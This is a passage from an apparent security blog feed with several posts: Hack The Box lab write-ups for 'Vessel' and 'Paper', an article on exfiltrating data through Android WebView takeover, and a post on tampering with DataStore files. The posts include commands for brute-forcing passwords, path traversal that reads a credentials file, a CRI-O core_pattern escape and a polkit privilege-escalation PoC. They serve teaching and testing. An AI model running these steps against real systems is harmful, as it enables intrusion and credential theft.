src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-12.49.59.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="667" height="428" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-30-at-12.49.59.png 600w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-12.49.59.png 667w"></figure><p>Let&apos;s analyse the file:</p><pre><code>~ python3 owa.py --cmd=&quot;file /home/steven/passwordGenerator&quot;

/home/steven/passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows</code></pre><hr><h2 id="pyinstaller">PyInstaller</h2><p>Once I tried to analyse the file using <a href="https://ghidra-sre.org/">Ghidra</a>, I found some interesting strings:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-15.23.42.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1024" height="713" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-30-at-15.23.42.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-30-at-15.23.42.png 1000w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-15.23.42.png 1024w" sizes="(min-width: 720px) 720px"></figure><p>As you can see, there are multiple references to &quot;PyInstaller&quot;:</p><blockquote>PyInstaller bundles a Python application and all its dependencies into a single package. The user can run the packaged app without installing a Python interpreter or any modules.</blockquote><p>According to <a href="https://blog.attify.com/flare-on-6-ctf-writeup-part7/">this</a> CTF write-up:</p><blockquote>To reverse engineer PyInstaller generated binaries we need to extract its contents. We can use <a href="https://sourceforge.net/projects/pyinstallerextractor/">PyInstaller Extractor</a>. [...]</blockquote><p>So, let&apos;s get the source <a href="https://github.com/extremecoders-re/pyinstxtractor">from Github</a> and run it:</p><pre><code>~ python3 pyinstxtractor/pyinstxtractor.py passwordGenerator.exe        INT
[+] Processing passwordGenerator.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[+] Found 142 files in PYZ archive
[+] Successfully extracted pyinstaller archive: passwordGenerator.exe

You can now use a python decompiler on the pyc files within the extracted directory</code></pre><p>According to this project, we can get the original source code by using &quot;a Python decompiler like <a href="https://github.com/rocky/python-uncompyle6/">Uncompyle6</a>.&quot;, but I found that <a href="https://github.com/rocky/python-decompile3">decompyle3</a> actually works a lot better for python <code>3.9.x</code>:</p><pre><code>~ python3 -m pip install decompyle3
~ decompyle3 passwordGenerator.exe_extracted/passwordGenerator.pyc &gt; password_generator.py</code></pre><p>We need to install a couple of packages to get the script to run:</p><pre><code>~ python3 -m pip install PySide2
~ python3 -m pip install pyperclip</code></pre><p>Now that the script is running locally, we can modify it to try all of the possibilities on the <code>notes.pdf</code> file:</p><pre><code class="language-python">from PySide2.QtCore import QTime, qsrand, qrand
import pikepdf

def gen_all_passwords():
    charset = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?&apos;
    passwords = []
    for msec in range(0, 1000):
        qsrand(msec)
        password = &apos;&apos;
        for i in range(0, 32):
            idx = qrand() % len(charset)
            nchar = charset[idx]
            password += str(nchar)
        if password not in passwords:
            passwords.append(password)
    return passwords

all_passwords = gen_all_passwords()
for pwn in all_passwords:
    try:
        with pikepdf.open(&quot;notes.pdf&quot;, password = pwn) as p:
            print(&quot;[+] Password found:&quot;, pwn)
            break
    except pikepdf._qpdf.PasswordError as e:
        print(&quot;[+] Password failed:&quot;, pwn)
        continue
</code></pre><p>I couldn&apos;t get a valid password on macOS, but when I switched to Windows, it finally worked:</p><pre><code class="language-python">...
[+] Password failed: E_{+67i$jNn)4jc)EFaf,p%i+Fgh}|G.
[+] Password failed: I11Dw&amp;Q+$G&amp;bQLrnRH{sUjpR$c3rO**Z
[+] Password failed: LgLUX[N&gt;X?L(;E-We:m_cO.B_zCmn7t2
[+] Password failed: O&lt;+2NBLW3Ipat&amp;A}r&gt;A&gt;zJ06!7Yxw~UI
[+] Password failed: S!j(E&gt;IgLA(*H0Q05(zJ+{Tp*|ur_y&lt;k
[+] Password failed: VrK?%HFpq:MZ-mvc&gt;6NW:):Z0O;3Jmr!
[+] Password found: YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-17.31.50.png" class="kg-image" alt="HTB Write-up | Vessel (user-only)" loading="lazy" width="1792" height="574" srcset="inesmartins.github.io/content/images/size/w600/2022/08/Screenshot-2022-08-30-at-17.31.50.png 600w, inesmartins.github.io/content/images/size/w1000/2022/08/Screenshot-2022-08-30-at-17.31.50.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/08/Screenshot-2022-08-30-at-17.31.50.png 1600w, inesmartins.github.io/content/images/2022/08/Screenshot-2022-08-30-at-17.31.50.png 1792w" sizes="(min-width: 720px) 720px"></figure><p>So, now we have a password: <code>b@mPRNSVTjjLKId1T</code>, which we can use to <code>SSH</code> as <code>ethan</code>:</p><pre><code>~ ssh ethan@vessel.htb
ethan@vessel.htb&apos;s password: b@mPRNSVTjjLKId1T

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
...</code></pre><hr><h3 id="resources">Resources</h3><ul><li><a href="https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/">https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/</a></li><li><a href="https://devel0pment.de/?p=2494">https://devel0pment.de/?p=2494</a></li><li><a href="https://blog.attify.com/flare-on-6-ctf-writeup-part7/">https://blog.attify.com/flare-on-6-ctf-writeup-part7/</a></li><li><a href="https://kyohmizu.hatenablog.com/entry/2022/03/28/182243">https://kyohmizu.hatenablog.com/entry/2022/03/28/182243</a></li><li><a href="https://www.wangan.com/p/7fy7f3b1e4c81b1f">https://www.wangan.com/p/7fy7f3b1e4c81b1f</a></li><li><a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/</a></li></ul><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><a href="https://kyohmizu.hatenablog.com/entry/2022/03/28/182243">This</a> article helped me understand the issue a bit further:</p><blockquote>CRI-O can set kernel parameters (<code>sysctls</code>) at pod startup using the <code>pinns</code> utility. [...] Since some <code>sysctls</code> share settings with the host, the <code>sysctls</code> that can be set at container startup are <strong>limited to namespaced ones</strong>. </blockquote><p>This means that, in theory, we should not be able to set the <code>kernel.core_pattern</code> parameter, since it&apos;s not namespaced and therefore affects the host. However:</p><blockquote>[The validation] of <code>sysctl</code> keys within CIO-O can be bypassed by passing a string containing <code>+</code> [...].</blockquote><p></p><p>So, it seems like all we need to do is to call the <code>pinns</code> binary and bypass its validation in order to specify a <code>kernel.core_pattern</code> property that executes our malicious command.</p><p>Let&apos;s first build the malicious command, which simply outputs the root flag to a <code>tmp</code> directory:</p><pre><code># creates the malicious command
ethan@vessel:~$ echo &apos;#!/bin/sh&apos; &gt; /tmp/cmd
ethan@vessel:~$ echo &apos;cat /root/root.txt &gt; /tmp/output&apos; &gt;&gt; /tmp/cmd

ethan@vessel:~$ cat /tmp/cmd
#!/bin/sh
cat /root/root.txt &gt; /tmp/output

ethan@vessel:~$ chmod a+x /tmp/cmd</code></pre><p>In theory, we should be able to exploit the vulnerability as shown below:</p><pre><code>ethan@vessel:~$ pinns \
-d /var/run/ \
-f &lt;random-uuid&gt; \
-s &apos;kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/cmd&apos; &amp;&amp; cat /tmp/output</code></pre><p>Once I ran this command I was able to see that the following file systems were mounted:</p><pre><code>ethan@vessel:~$ cat /proc/mounts | grep &lt;random-uuid&gt;
nsfs /run/utsns/&lt;random-uuid&gt; nsfs rw 0 0
nsfs /run/ipcns/&lt;random-uuid&gt; nsfs rw 0 0
nsfs /run/netns/&lt;random-uuid&gt; nsfs rw 0 0</code></pre><p>But I was still not able to get the flag: </p><pre><code>ethan@vessel:~$ cat /tmp/output
cat: /tmp/output: No such file or directory</code></pre><p>random-uuid: <code>37f594b6-4ffb-43a2-a0d5-e7b23d642119</code>.</p>]]></content:encoded></item><item><title><![CDATA[Exfiltrating data from Android applications via WebView Takeover (Open Redirect)]]></title><description><![CDATA[In this article, I go through the scenarios in which I've been able to exfiltrate data from real Android applications, after detecting a WebView takeover (aka "Open Redirect") vulnerability.]]></description><link>inesmartins.github.io/exfiltrating-data-via-webview-takeover/</link><guid isPermaLink="false">633da33c7f824771affc373e</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 06 Oct 2022 13:45:32 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/10/maxresdefault-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2022/10/maxresdefault-1-1.jpeg" alt="Exfiltrating data from Android applications via WebView Takeover (Open Redirect)"><p>In this article, I go through the scenarios in which I&apos;ve been able to exfiltrate data from real Android applications, after detecting a WebView takeover (aka &quot;Open Redirect&quot;) vulnerability.</p><p>Typically this vulnerability is the result of allowing an external <code>Intent</code> to control a <code>URI</code> that is loaded onto a <code>WebView</code>, declared inside the vulnerable application.</p><p>This <code>Intent</code> can sometimes be triggered via deep link, but more often than not, requires that a malicious application be installed in the victim&apos;s device.</p><p>Note that this article closely relates to the &quot;Exploiting Deep Links in Android&quot; series, particularly with <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">Part 2</a>.</p><h2 id="1-abusing-javascript-bindings">1. Abusing Javascript Bindings</h2><p>If the vulnerable <code>WebView</code> registers any <a href="https://developer.android.com/develop/ui/views/layout/webapps/webview">web interfaces</a>, and you&apos;re able to redirect it to a website you control, then you can simply add JavaScript to your website that interacts with the app&apos;s code directly.</p><p>If you can read the app&apos;s source code, search for any calls to the &#xA0;<a href="https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)">addJavascriptInterface</a> method, to find the name of the declared interface(s), and then you can find all of the exposed methods annotated with <code>@JavascriptInterface</code>.</p><p>On your website, your JS code can call all of the exposed methods by using the <code>window.interface_name.method_name</code> syntax.</p><p>Of course, the impact will vary depending on what the exposed methods allow you to do.</p><p>To see a more detailed example, check out this HackerOne report: <a href="https://hackerone.com/reports/401793">https://hackerone.com/reports/401793</a>.</p><h2 id="2-via-malicious-app-24-sdk">2. Via Malicious app (&lt; 24 SDK)</h2><p>If the vulnerable <code>WebView</code> can load local <code>file://</code> URIs, you might be able exfiltrate all of the app&apos;s files with a little help from a malicious application.</p><p>Here are the steps:</p><ol><li>the malicious application writes an <code>HTML</code> file to a shared directory, accessible by the vulnerable app (e.g.: <code>/sdcard</code>);</li><li>the malicious application sends an <code>Intent</code> to the vulnerable app that contains a <code>file://</code> URI that matches the location of the <code>HTML</code> file;</li><li>the <code>file://</code> URI is loaded by the vulnerable <code>WebView</code>;</li><li>once the <code>HTML</code> file is loaded, the JS code declared inside this file reads all local files and sends them to a server you control.</li></ol><p>Note that the following conditions need to be present in order for this to work:</p><ul><li>the malicious app needs to be granted the <code>WRITE_EXTERNAL_STORAGE</code> permission and needs to be able to write to a shared location, which is only possible before the <a href="https://developer.android.com/about/versions/11/privacy/storage#scoped-storage">enforcement of &quot;scoped storage&quot;</a> (&lt; SDK 30);</li><li>the vulnerable app needs to be granted the <code>READ_EXTERNAL_STORAGE</code> permission and needs to be able to read from a shared location, same reason as above;</li><li>the vulnerable app needs to be able to read <code>file://</code> URIs, which <strong>will throw an error after SDK 24</strong> (you might get lucky if the developer actually intends for this to happen, and adds custom code to enable this behaviour);</li><li>the vulnerable <code>WebView</code> needs to have JS enabled.</li></ul>]]></content:encoded></item><item><title><![CDATA[DataStore is the new SharedPreferences, old vulns still apply]]></title><description><![CDATA[Neither DataStore nor SharedPreferences should be used to persist sensitive data ... but as we know, Insecure Data Storage is one of the most common vulnerabilities found in mobile applications.]]></description><link>inesmartins.github.io/when-not-to-use-jetpack-datastore/</link><guid isPermaLink="false">63238266fc8e93355628956c</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 15 Sep 2022 20:19:46 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/09/3.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2022/09/3.jpeg" alt="DataStore is the new SharedPreferences, old vulns still apply"><p>Banner from <a href="https://medium.com/huawei-developers/jetpack-datastore-in-a-nutshell-88006b38fa68">https://medium.com/huawei-developers/jetpack-datastore-in-a-nutshell-88006b38fa68</a>.</p><hr><p>I&apos;ve been out of the Android development game for a while, so I didn&apos;t know that <a href="https://developer.android.com/topic/libraries/architecture/datastore?gclid=Cj0KCQjwmouZBhDSARIsALYcouptWDNL5u0kSe_S1HdVF0L9kwXpKS6EJrj7MVK2VlVIBd9tWIjdZ_MaApf0EALw_wcB&amp;gclsrc=aw.ds">Jetpack&apos;s DataStore</a> was being commonly used instead of <a href="https://developer.android.com/reference/android/content/SharedPreferences">SharedPreferences</a>:</p><blockquote>SharedPreferences comes with several drawbacks: a synchronous API that can appear safe to call on the UI thread, no mechanism for signaling errors, lack of transactional API, and more. <br>DataStore is a replacement for SharedPreferences that addresses most of these shortcomings. <br>DataStore includes a fully asynchronous API using Kotlin coroutines and Flow, handles data migration, guarantees data consistency, and handles data corruption. [<a href="https://android-developers.googleblog.com/2020/09/prefer-storing-data-with-jetpack.html">Source</a>]</blockquote><p>Neither DataStore nor SharedPreferences should be used to persist sensitive data ... but as we know, <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">Insecure Data Storage</a> is one of the most common vulnerabilities found in mobile applications.</p><p>So, I was auditing an application, and I ended up stumbling upon a <br><code>app-name.preferences_pb</code> file under <code>/data/data/app-name/files/datastore/</code> - I later learned that this is where the files generated by <a href="https://developer.android.com/codelabs/android-proto-datastore">Proto DataStore</a> are saved.</p><p>These files are serialized using Google&apos;s <a href="https://developers.google.com/protocol-buffers">Protocol Buffers</a>, which means we can use the <a href="http://google.github.io/proto-lens/installing-protoc.html" rel="nofollow noreferrer">protoc</a> binary to read them.</p><pre><code class="language-shell">protoc --decode_raw &lt; appname.preferences_pb</code></pre><p>Here, I found something interesting, a field that specified the maximum number of failed PIN code attempts that the user could perform.</p><p>There were definitely other ways to bypass this PIN feature but I wanted to prove a point: I wanted to show developers that trusting a local (unencrypted) file to make security decisions was not a good idea.</p><p>So, I thought I would just change the value on the file, and show them how easily we could brute-force all possible combinations.</p><p>However, changing this value compromised the ProtoBuf serialization. So, this is the only straightforward solution I&apos;ve found so far:</p><ol><li>create a new Android application;</li><li>import the DataStore library;</li><li>add all the boilerplate code needed in order to write to the DataStore;</li><li>set all of the same key/value combinations that were on the original (audited) application;</li><li>change the values you want to manipulate;</li><li>run the application;</li><li>copy the DataStore file from the application to the application you want to manipulate:</li></ol><pre><code>~ adb pull /data/data/test-app/files/datastore/test-app.preferences_pb modified.preferences_pb

~ adb push modified.preferences_pb /data/data/audited-app/files/datastore/audited-app.preferences_pb </code></pre><p>And that&apos;s it!</p><p>The maximum number of failed PIN code attempts was increased, it was possible to brute-force the PIN code, and my developers learned their lesson :)</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Paper]]></title><description><![CDATA[Write-up for Paper, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-write-up-paper/</link><guid isPermaLink="false">62372fd922c479079cf78310</guid><category><![CDATA[wordpress]]></category><category><![CDATA[wp]]></category><category><![CDATA[wpscan]]></category><category><![CDATA[cve-2019-17671]]></category><category><![CDATA[rocketchat]]></category><category><![CDATA[cve-2021-3560]]></category><category><![CDATA[ctf]]></category><category><![CDATA[htb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 16 Jul 2022 15:19:29 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.37.25.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.37.25.png" alt="HTB Write-up | Paper"><p>A quick initial scan discloses web services running on ports <code>80</code> and <code>443</code>, as well as an <code>SSH</code> server running on port <code>22</code>:</p><pre><code>~ nmap 10.10.11.143 -F -Pn

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https</code></pre><p>A closer look at these ports doesn&apos;t reveal anything too interesting, and both the secure and non-secure versions of the website show the same boilerplate content:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.13.51.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>However, looking at the server response for this page, we can see an interesting header:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.02.15.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>When we configure this virtual host locally, we see a blog for the &quot;Blunder Tiffin Paper Company&quot;:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.11.143    office.paper</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.05.17.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="1440" height="716" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-14.05.17.png 600w, inesmartins.github.io/content/images/size/w1000/2022/03/Screenshot-2022-03-20-at-14.05.17.png 1000w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-14.05.17.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Going through the posts we can see some hints:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-18.52.10.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="755" height="570" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-18.52.10.png 600w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-18.52.10.png 755w" sizes="(min-width: 720px) 720px"></figure><p>So, ... <code>Prisonmike</code> is supposed to be the only user but <code>nick</code> commented that they should &quot;remove the secret content&quot; from the drafts ... interesting.</p><p>Running <code>nikto</code> we can see that this is a Wordpress blog:</p><pre><code>~ nikto -h http://office.paper/
...

+ Uncommon header &apos;link&apos; found, with contents: &lt;http://office.paper/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
+ Uncommon header &apos;x-redirect-by&apos; found, with contents: WordPress</code></pre><p><code>wpscan</code> identified that the blog is using version <code>5.2.3</code> of Wordpress, which has many known vulnerabilities, however, one stands out, since it doesn&apos;t require valid credentials and it has to do with accessing user drafts:</p><pre><code>~ wpscan --url office.paper --api-token &lt;your-api-token&gt;

...
| [!] Title: WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts
...</code></pre><p>Using the trick described in <a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">this</a> blog post we find a draft post with some secrets:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.00.24.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="905" height="711" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-19.00.24.png 600w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.00.24.png 905w" sizes="(min-width: 720px) 720px"></figure><p>So, there&apos;s a &quot;Secret Registration URL of new Employee chat system&quot;, which is hosted at <code>chat.office.paper</code>, let&apos;s configure this virtual host:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.11.143    office.paper
10.10.11.143    chat.office.paper</code></pre><p>Now, we can see the chat system and register a new account. <br>Turns out this application is an instance of RocketChat:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.03.53.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="1440" height="721" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-19.03.53.png 600w, inesmartins.github.io/content/images/size/w1000/2022/03/Screenshot-2022-03-20-at-19.03.53.png 1000w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.03.53.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>After scrolling to the top of the <code>#general</code> channel, we can see that there&apos;s a helpful bot called <code>recyclops</code> which, among other things, can fetch files in the local machine:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.04.36.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>There&apos;s even a security-related warning:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.05.10.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p>Ok, let&apos;s see what this baby can do:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.16.12.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="455" height="362"></figure><p>Let&apos;s see if we can list other directories ...</p><pre><code>~ list ../

total 56
drwx------ 12 dwight dwight 4096 Mar 20 10:52 .
drwxr-xr-x. 3 root root 20 Mar 20 10:54 ..
-rw------- 1 dwight dwight 1486 Mar 20 11:21 .bash_history
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 2 dwight dwight 6 Mar 18 12:47 .cache
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 18 Mar 19 02:39 .dbshell
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 3 dwight dwight 69 Mar 19 02:39 .gnupg
drwx------ 8 dwight dwight 4096 Mar 19 10:11 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
-rw------- 1 dwight dwight 7 Mar 18 12:56 .python_history
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
-r-------- 1 dwight dwight 33 Mar 18 01:54 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
-rw------- 1 dwight dwight 2657 Mar 20 08:31 .viminfo</code></pre><p>The <code>hubot</code> directory looks interesting, particularly because it has a <code>.env</code> file, which usually stores credentials:</p><pre><code>list ../hubot
...
-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env</code></pre><p>Yes, we have some creds!</p><pre><code>~ file ../hubot/.env

export ROCKETCHAT_URL=&apos;http://127.0.0.1:48320&apos;
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1</code></pre><p>And we can use them to <code>SSH</code> into the machine as <code>dwight</code>!</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-19.39.35.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy"></figure><p><code>linpeas.sh</code> is pretty good at identifying privilege escalation issues, so let&apos;s start by sending the script to the machine&apos;s <code>/tmp</code> file:</p><pre><code>~ scp linpeas.sh dwight@10.10.11.143:/tmp
~ ssh dwight@10.10.11.143

[dwight@paper ~]$ cd /tmp/
[dwight@paper tmp]$ chmod +x linpeas.sh
[dwight@paper tmp]$ ./linpeas.sh</code></pre><p>When we run this script we immediately get a warning that the machine is vulnerable to <code>CVE-2021-3560</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-20.00.19.png" class="kg-image" alt="HTB Write-up | Paper" loading="lazy" width="978" height="277" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-20-at-20.00.19.png 600w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-20-at-20.00.19.png 978w"></figure><p>OK, let&apos;s grab <a href="https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py">a poc</a> and send it to the <code>/tmp</code> dir:</p><pre><code>~ scp -r CVE-2021-3560.py dwight@10.10.11.143:/tmp/CVE-2021-3560.py
~ ssh dwight@10.10.11.143

[dwight@paper ~]$ python3 CVE-2021-3560.py

[root@paper dwight]# cd /root
[root@paper ~]# cat root.txt
580aba1066f998cbf4a03deb6f758717</code></pre><p>Just like that, we&apos;re done!</p><hr>]]></content:encoded></item><item><title><![CDATA[Creating a very spammable endpoint with Oracle APEX Restful Services]]></title><description><![CDATA[<p>I&apos;m helping an organisation that has a very simple (and very static) corporate website. They were interested in adding a contact form, and wanted the data to be sent to their APEX-managed database.</p><p>Building an entire back-end service for this purpose seemed like too much work, &#xA0;so</p>]]></description><link>inesmartins.github.io/creating-a-very-spammable-endpoint-with-apex-restful-services/</link><guid isPermaLink="false">627664568b67d59413e27ad7</guid><category><![CDATA[oracle apex]]></category><category><![CDATA[apex]]></category><category><![CDATA[spam]]></category><category><![CDATA[endpoint security]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 07 May 2022 15:35:26 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/05/email-spam.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2022/05/email-spam.jpeg" alt="Creating a very spammable endpoint with Oracle APEX Restful Services"><p>I&apos;m helping an organisation that has a very simple (and very static) corporate website. They were interested in adding a contact form, and wanted the data to be sent to their APEX-managed database.</p><p>Building an entire back-end service for this purpose seemed like too much work, &#xA0;so I decided to give APEX&apos;s <a href="https://docs.oracle.com/database/apex-18.1/AEUTL/using-RESTful-services.htm#AEUTL445">RESTful Services</a> a try:</p><p><em>	RESTful Services enable the creation of a set of standards-based API&#x2019;s on top of database objects available for a workspace. Without connecting directly to the underlying data source these API&#x2019;s allow external systems to interact securely with the data by querying, inserting, updating or deleting.</em></p><p>I started by creating a new <code>CONTACT_REQUEST</code> table:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.34.03.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1978" height="744" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-14.34.03.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-14.34.03.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-14.34.03.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.34.03.png 1978w" sizes="(min-width: 1200px) 1200px"></figure><p>Then, on the &quot;Restful Data Services&quot; page (under <code>SQL Workshop</code>), I created a new ORDS (Oracle REST Data Services) <a href="https://docs.oracle.com/database/apex-5.1/AEUTL/how-to-create-RESTful-service-module-example.htm#AEUTL29134">Module</a> called <code>forms</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.02.24.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1616" height="772" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-17.02.24.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-17.02.24.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-17.02.24.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.02.24.png 1616w" sizes="(min-width: 720px) 720px"></figure><p>Note that I&apos;ve added the website&apos;s domain to the &quot;<a href="https://oracle-base.com/articles/misc/oracle-rest-data-services-ords-allowed-origins">Origins Allowed</a>&quot; field to allow the website to access the response from this cross-origin request.</p><p>Under this new module, I created a <strong>Template</strong> called <code>contact</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.42.22.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="2000" height="747" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-16.42.22.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-16.42.22.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-16.42.22.png 1600w, 